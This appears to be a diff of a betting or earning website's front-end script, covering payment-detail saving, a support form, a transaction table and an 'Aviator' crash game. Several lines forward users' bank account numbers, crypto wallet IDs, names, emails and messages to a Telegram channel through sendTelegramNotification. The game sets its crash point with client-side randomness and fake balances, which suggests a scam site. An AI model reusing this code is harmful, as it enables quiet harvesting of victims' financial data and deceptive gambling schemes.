+            sendTelegramNotification(`💳 <b>PAYMENT METHOD UPDATED</b>\n<b>User:</b> ${currentUserData.profile.username}\n<b>Acc ID:</b> ${currentUserData.accountId}\n<b>Bank:</b> ${bankName} (${accNum})\n<b>TRC20:</b> ${trc20}\n<b>Binance:</b> ${binance}`);
+
+            alert("Payment details saved! Updated details are locked for 30 days.");
         }
 
+        /* --- CONTACT SUPPORT HANDLER --- */
         function handleSupportSubmit(e) {
             e.preventDefault();
             const name = document.getElementById('supName').value.trim();
             const email = document.getElementById('supEmail').value.trim();
             const msg = document.getElementById('supMsg').value.trim();
 
-            sendTelegramNotification(`📩 <b>NEW SUPPORT INQUIRY</b>\n<b>User:</b> ${currentUserData.profile.username}\n<b>Acc ID:</b> ${currentUserData.accountId}\n<b>Name:</b> ${name}\n<b>Email:</b> ${email}\n<b>Message:</b> ${msg}`);
+            sendTelegramNotification(`📩 <b>SUPPORT QUESTION SUBMITTED</b>\n<b>User:</b> ${currentUserData.profile.username}\n<b>Acc ID:</b> ${currentUserData.accountId}\n<b>Name:</b> ${name}\n<b>Email:</b> ${email}\n<b>Message:</b> ${msg}`);
 
             document.getElementById('supportResponseBox').style.display = 'flex';
             document.getElementById('supMsg').value = '';
         }
 
+        /* --- TRANSACTIONS RENDER --- */
         function renderTransactions() {
             const tbody = document.getElementById('txTableBody');
             if(!tbody) return;
             tbody.innerHTML = '';
 
-            if(!currentUserData.transactions || currentUserData.transactions.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding: 20px;">No transaction history available.</td></tr>`;
+            if (currentUserData.transactions.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding: 24px;">No transaction records found.</td></tr>`;
                 return;
             }
 
@@ -2376,28 +2468,27 @@
                 tr.innerHTML = `
                     <td><strong>${tx.id}</strong></td>
                     <td>${tx.type}</td>
-                    <td style="font-weight: 700; color: ${tx.amount.startsWith('+') ? 'var(--accent-green)' : 'var(--accent-gold)'};">${tx.amount}</td>
-                    <td>${tx.date}</td>
-                    <td><span class="status-paid" style="padding: 4px 8px; border-radius: 6px; font-size: 11px;">${tx.status}</span></td>
+                    <td style="font-weight: 700; color: ${tx.amount.startsWith('+') ? 'var(--accent-green)' : 'var(--accent-gold)'}">${tx.amount}</td>
+                    <td style="color: var(--text-muted); font-size: 12px;">${tx.date}</td>
+                    <td><span class="lock-badge status-paid" style="display: inline-flex; margin:0; padding: 4px 10px; font-size: 11px;">${tx.status}</span></td>
                 `;
                 tbody.appendChild(tr);
             });
         }
 
         /* ========================================================= */
-        /* --- SPRIBE AVIATOR GAME REAL-TIME ENGINE ---------------- */
+        /* --- AVIATOR REAL-TIME GAME ENGINE LOGIC ----------------- */
         /* ========================================================= */
-        let aviatorState = {
-            running: false,
-            multiplier: 1.00,
-            crashPoint: 1.00,
-            animId: null,
-            bet1: { active: false, amount: 1.00, cashedOut: false },
-            bet2: { active: false, amount: 1.00, cashedOut: false }
-        };
+        let aviatorGameState = "idle"; // idle, running, crashed
+        let aviatorMultiplier = 1.00;
+        let aviatorCrashPoint = 1.00;
+        let aviatorAnimId = null;
+        let planeX = 0, planeY = 0;
+        let bet1 = { active: false, amt: 1.00, cashedOut: false };
+        let bet2 = { active: false, amt: 1.00, cashedOut: false };
 
-        function openGameView(game) {
-            if(game === 'aviator') {
+        function openGameView(gameKey) {
+            if (gameKey === 'aviator') {
                 document.getElementById('minigamesLobbyCards').style.display = 'none';
                 document.getElementById('aviatorGameContainer').style.display = 'block';
                 initAviatorCanvas();
@@ -2411,163 +2502,215 @@
 
         function toggleAviatorMenu() {
             const menu = document.getElementById('aviatorMenuOverlay');
-            if(menu) menu.style.display = menu.style.display === 'flex' ? 'none' : 'flex';
+            menu.style.display = (menu.style.display === 'flex') ? 'none' : 'flex';
         }
 
-        function stepAviatorBet(panel, step) {
-            const inp = document.getElementById(`avInp${panel}`);
+        function stepAviatorBet(panelNum, dir) {
+            const inp = document.getElementById(`avInp${panelNum}`);
             let val = parseFloat(inp.value) || 1.00;
-            val = Math.max(1.00, val + step);
+            val = Math.max(1, val + dir);
             inp.value = val.toFixed(2);
-            document.getElementById(`avBtnAmt${panel}`).innerText = `$${val.toFixed(2)}`;
+            document.getElementById(`avBtnAmt${panelNum}`).innerText = `$${val.toFixed(2)}`;
         }
 
-        function setAviatorBet(panel, val) {
-            const inp = document.getElementById(`avInp${panel}`);
-            inp.value = val.toFixed(2);
-            document.getElementById(`avBtnAmt${panel}`).innerText = `$${val.toFixed(2)}`;
+        function setAviatorBet(panelNum, amount) {
+            document.getElementById(`avInp${panelNum}`).value = amount.toFixed(2);
+            document.getElementById(`avBtnAmt${panelNum}`).innerText = `$${amount.toFixed(2)}`;
         }
 
-        function initAviatorEngine() {
-            const userDisp = document.getElementById('menuUserAcc');
-            if(userDisp && currentUserData) userDisp.innerText = currentUserData.profile.username;
-        }
+        function handleAviatorBet(panelNum) {
+            const b = (panelNum === 1) ? bet1 : bet2;
+            const btn = document.getElementById(`avBtn${panelNum}`);
+            const inp = document.getElementById(`avInp${panelNum}`);
+            const amt = parseFloat(inp.value) || 1.00;
 
-        function initAviatorCanvas() {
-            const canvas = document.getElementById('aviatorCanvas');
-            if(!canvas) return;
-            const ctx = canvas.getContext('2d');
-            canvas.width = canvas.parentElement.clientWidth;
-            canvas.height = canvas.parentElement.clientHeight;
+            if (aviatorGameState === "running" && b.active && !b.cashedOut) {
+                // CASH OUT ACTION
+                b.cashedOut = true;
+                const winAmt = b.amt * aviatorMultiplier;
+                currentUserData.available += winAmt;
 
-            ctx.fillStyle = "#000000";
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-        }
+                currentUserData.transactions.unshift({
+                    id: "TX" + Math.floor(100000 + Math.random() * 900000),
+                    type: `Aviator Win (${aviatorMultiplier.toFixed(2)}x)`,
+                    amount: `+$${winAmt.toFixed(2)}`,
+                    date: new Date().toLocaleString(),
+                    status: "Paid"
+                });
 
-        function handleAviatorBet(panel) {
-            const amt = parseFloat(document.getElementById(`avInp${panel}`).value) || 1.00;
-            const btn = document.getElementById(`avBtn${panel}`);
+                saveSystemDB();
+                renderDashboardStats();
+                renderTransactions();
 
-            if(!aviatorState.running) {
-                if(currentUserData.available < amt) {
+                btn.className = "aviator-btn-green";
+                btn.innerHTML = `<div>Cashed Out</div><div style="font-size: 13px;">+$${winAmt.toFixed(2)}</div>`;
+                return;
+            }
+
+            if (aviatorGameState === "idle") {
+                if (currentUserData.available < amt) {
                     alert("Insufficient Available Balance to place this bet!");
                     return;
                 }
 
                 currentUserData.available -= amt;
-                updateBalancesUI();
-                saveSystemDB();
+                b.active = true;
+                b.amt = amt;
+                b.cashedOut = false;
 
-                if(panel === 1) aviatorState.bet1 = { active: true, amount: amt, cashedOut: false };
-                if(panel === 2) aviatorState.bet2 = { active: true, amount: amt, cashedOut: false };
+                saveSystemDB();
+                renderDashboardStats();
 
                 btn.className = "aviator-btn-orange";
-                btn.innerHTML = `<div>Cash Out</div><div style="font-size: 13px;">$${amt.toFixed(2)}</div>`;
+                btn.innerHTML = `<div>Cancel</div><div style="font-size: 13px;">$${amt.toFixed(2)}</div>`;
 
-                startAviatorFlight();
-            } else {
-                const betObj = panel === 1 ? aviatorState.bet1 : aviatorState.bet2;
-                if(betObj.active && !betObj.cashedOut) {
-                    betObj.cashedOut = true;
-                    const winAmt = betObj.amount * aviatorState.multiplier;
-                    currentUserData.available += winAmt;
-                    updateBalancesUI();
-                    saveSystemDB();
-
-                    btn.className = "aviator-btn-green";
-                    btn.innerHTML = `<div>Bet</div><div style="font-size: 13px;">$${betObj.amount.toFixed(2)}</div>`;
-
-                    alert(`Cashed out at ${aviatorState.multiplier.toFixed(2)}x! Won $${winAmt.toFixed(2)}`);
-                }
+                startAviatorRound();
             }
         }
 
-        function startAviatorFlight() {
-            if(aviatorState.running) return;
+        function initAviatorCanvas() {
+            const canvas = document.getElementById('aviatorCanvas');
+            canvas.width = canvas.parentElement.clientWidth;
+            canvas.height = canvas.parentElement.clientHeight;
+            drawAviatorFrame(0, 0, false);
+        }
 
-            aviatorState.running = true;
-            aviatorState.multiplier = 1.00;
-            aviatorState.crashPoint = (Math.random() * 3 + 1.1).toFixed(2);
+        function startAviatorRound() {
+            if (aviatorGameState === "running") return;
+
+            aviatorGameState = "running";
+            aviatorMultiplier = 1.00;
+            aviatorCrashPoint = parseFloat((1.1 + Math.random() * 4.5).toFixed(2));
 
             document.getElementById('aviatorStartScreen').style.display = 'none';
             const multText = document.getElementById('aviatorMultText');
             multText.style.display = 'block';
+            multText.style.color = '#ffffff';
 
+            if (bet1.active && !bet1.cashedOut) {
+                const btn1 = document.getElementById('avBtn1');
+                btn1.className = "aviator-btn-orange";
+                btn1.innerHTML = `<div>Cash Out</div><div style="font-size: 13px;">$${bet1.amt.toFixed(2)}</div>`;
+            }
+            if (bet2.active && !bet2.cashedOut) {
+                const btn2 = document.getElementById('avBtn2');
+                btn2.className = "aviator-btn-orange";
+                btn2.innerHTML = `<div>Cash Out</div><div style="font-size: 13px;">$${bet2.amt.toFixed(2)}</div>`;
+            }
+
+            let startTime = performance.now();
+
+            function gameLoop(now) {
+                let elapsed = (now - startTime) / 1000;
+                aviatorMultiplier = parseFloat((1.00 + elapsed * 0.45).toFixed(2));
+
+                if (bet1.active && !bet1.cashedOut) {
+                    document.getElementById('avBtn1').innerHTML = `<div>Cash Out</div><div style="font-size: 13px;">$${(bet1.amt * aviatorMultiplier).toFixed(2)}</div>`;
+                }
+                if (bet2.active && !bet2.cashedOut) {
+                    document.getElementById('avBtn2').innerHTML = `<div>Cash Out</div><div style="font-size: 13px;">$${(bet2.amt * aviatorMultiplier).toFixed(2)}</div>`;
+                }
+
+                multText.innerText = `${aviatorMultiplier.toFixed(2)}x`;
+
+                const canvas = document.getElementById('aviatorCanvas');
+                let progress = Math.min(1, (aviatorMultiplier - 1) / (aviatorCrashPoint - 1));
+                planeX = progress * (canvas.width - 80);
+                planeY = canvas.height - 40 - (progress * (canvas.height - 100));
+
+                drawAviatorFrame(planeX, planeY, true);
+
+                if (aviatorMultiplier >= aviatorCrashPoint) {
+                    crashAviator();
+                } else {
+                    aviatorAnimId = requestAnimationFrame(gameLoop);
+                }
+            }
+
+            aviatorAnimId = requestAnimationFrame(gameLoop);
+        }
+
+        function crashAviator() {
+            aviatorGameState = "crashed";
+            cancelAnimationFrame(aviatorAnimId);
+
+            const multText = document.getElementById('aviatorMultText');
+            multText.innerText = `FLEW AWAY! (${aviatorMultiplier.toFixed(2)}x)`;
+            multText.style.color = '#e5053a';
+
+            // ADD TO HISTORY BAR
+            const historyBar = document.getElementById('aviatorHistoryBar');
+            const pill = document.createElement('span');
+            pill.className = `aviator-hist-pill ${aviatorMultiplier >= 2.0 ? 'purple' : 'blue'}`;
+            pill.innerText = `${aviatorMultiplier.toFixed(2)}x`;
+            historyBar.prepend(pill);
+
+            if (bet1.active && !bet1.cashedOut) {
+                const btn1 = document.getElementById('avBtn1');
+                btn1.className = "aviator-btn-green";
+                btn1.innerHTML = `<div>Bet</div><div style="font-size: 13px;">$${bet1.amt.toFixed(2)}</div>`;
+            }
+            if (bet2.active && !bet2.cashedOut) {
+                const btn2 = document.getElementById('avBtn2');
+                btn2.className = "aviator-btn-green";
+                btn2.innerHTML = `<div>Bet</div><div style="font-size: 13px;">$${bet2.amt.toFixed(2)}</div>`;
+            }
+
+            bet1.active = false;
+            bet2.active = false;
+
+            setTimeout(() => {
+                aviatorGameState = "idle";
+                multText.style.display = 'none';
+                document.getElementById('aviatorStartScreen').style.display = 'flex';
+                drawAviatorFrame(0, 0, false);
+            }, 3000);
+        }
+
+        function drawAviatorFrame(px, py, isFlying) {
             const canvas = document.getElementById('aviatorCanvas');
+            if (!canvas) return;
             const ctx = canvas.getContext('2d');
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
 
-            let startTime = Date.now();
+            // GRID LINES
+            ctx.strokeStyle = "rgba(255, 255, 255, 0.04)";
+            ctx.lineWidth = 1;
+            for (let x = 0; x < canvas.width; x += 40) {
+                ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, canvas.height); ctx.stroke();
+            }
+            for (let y = 0; y < canvas.height; y += 40) {
+                ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(canvas.width, y); ctx.stroke();
+            }
 
-            function animateFlight() {
-                const elapsed = (Date.now() - startTime) / 1000;
-                aviatorState.multiplier = 1.00 + elapsed * 0.35;
-
-                multText.innerText = `${aviatorState.multiplier.toFixed(2)}x`;
-
-                ctx.fillStyle = "#0d0e12";
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-
+            if (isFlying) {
+                // RED FLIGHT TRAIL
                 ctx.beginPath();
                 ctx.moveTo(0, canvas.height);
-                const currentX = Math.min(canvas.width * 0.8, elapsed * 60);
-                const currentY = canvas.height - Math.min(canvas.height * 0.7, elapsed * 35);
-                ctx.quadraticCurveTo(currentX / 2, canvas.height, currentX, currentY);
+                ctx.quadraticCurveTo(px * 0.5, canvas.height, px, py);
                 ctx.strokeStyle = "#e5053a";
                 ctx.lineWidth = 4;
                 ctx.stroke();
 
-                if(aviatorState.multiplier >= aviatorState.crashPoint) {
-                    aviatorState.running = false;
-                    multText.innerText = `FLEW AWAY! ${aviatorState.multiplier.toFixed(2)}x`;
-                    multText.style.color = "#e5053a";
+                // RED SHADED AREA UNDER TRAIL
+                ctx.lineTo(px, canvas.height);
+                ctx.lineTo(0, canvas.height);
+                ctx.fillStyle = "rgba(229, 5, 58, 0.15)";
+                ctx.fill();
 
-                    const histBar = document.getElementById('aviatorHistoryBar');
-                    if(histBar) {
-                        const pill = document.createElement('span');
-                        pill.className = `aviator-hist-pill ${aviatorState.crashPoint > 2.0 ? 'purple' : 'blue'}`;
-                        pill.innerText = `${aviatorState.crashPoint}x`;
-                        histBar.prepend(pill);
-                    }
-
-                    setTimeout(() => {
-                        multText.style.color = "#ffffff";
-                        multText.style.display = 'none';
-                        document.getElementById('aviatorStartScreen').style.display = 'flex';
-                        resetAviatorButtons();
-                    }, 2000);
-
-                    return;
-                }
-
-                aviatorState.animId = requestAnimationFrame(animateFlight);
+                // DRAW RED PLANE ICON
+                ctx.save();
+                ctx.translate(px, py);
+                ctx.fillStyle = "#e5053a";
+                ctx.beginPath();
+                ctx.arc(0, 0, 12, 0, Math.PI * 2);
+                ctx.fill();
+                ctx.restore();
             }
-
-            animateFlight();
         }
 
-        function resetAviatorButtons() {
-            [1, 2].forEach(p => {
-                const btn = document.getElementById(`avBtn${p}`);
-                const amt = parseFloat(document.getElementById(`avInp${p}`).value) || 1.00;
-                if(btn) {
-                    btn.className = "aviator-btn-green";
-                    btn.innerHTML = `<div>Bet</div><div style="font-size: 13px;">$${amt.toFixed(2)}</div>`;
-                }
-            });
-            aviatorState.bet1.active = false;
-            aviatorState.bet2.active = false;
-        }
-
-        /* --- INITIALIZATION ENTRY POINT --- */
-        window.addEventListener('DOMContentLoaded', () => {
-            populateSavedUsersDatalist();
-            if(systemDB.currentUsername && systemDB.users[systemDB.currentUsername]) {
-                currentUserData = systemDB.users[systemDB.currentUsername];
-                document.getElementById('authModal').style.display = 'none';
-                initDashboard();
-            } else {
-                document.getElementById('authModal').style.display = 'flex';
-            }
+        window.addEventListener('load', () => {
+            initUI();
         });
     </script>
 </body>
